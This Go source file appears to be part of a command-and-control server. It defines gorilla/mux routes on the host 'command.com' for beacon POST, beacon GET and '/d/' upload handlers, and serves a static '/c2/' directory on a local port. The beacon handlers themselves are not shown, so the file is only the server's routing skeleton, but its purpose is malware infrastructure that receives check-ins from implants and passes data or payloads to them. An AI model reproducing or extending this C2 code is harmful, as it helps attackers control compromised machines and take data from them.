package main

import (
	"log"
	"time"
	"net/http"
	"encoding/json"
	"github.com/gorilla/mux"
)

func interfaceHandler(w http.ResponseWriter, h *http.Request) {
	json.NewEncoder(w).Encode(map[string]bool{"ok": true})
}

func startServerRoutine() {
	var router = mux.NewRouter()
	router.HandleFunc("/", interfaceHandler).Host("localhost")
	router.HandleFunc("/{data}", beaconPostHandler).Host("command.com").Methods("Post")
	router.HandleFunc("/{data}", beaconGetHandler).Host("command.com").Methods("Get")
	router.HandleFunc("/d/{data}", beaconUploadHandler).Host("command.com").Methods("Get")

	staticFileDirectory := http.Dir("./www/")
	staticFileHandler := http.StripPrefix("/c2/", http.FileServer(staticFileDirectory))
	router.PathPrefix("/c2/").Handler(staticFileHandler).Methods("GET")

	srv := &http.Server{
        Handler:      router,
        Addr:         "127.0.0.1:8001",
        WriteTimeout: 15 * time.Second,
        ReadTimeout:  15 * time.Second,
    }

	go func() {
    	log.Fatal(srv.ListenAndServe())	
	}()
}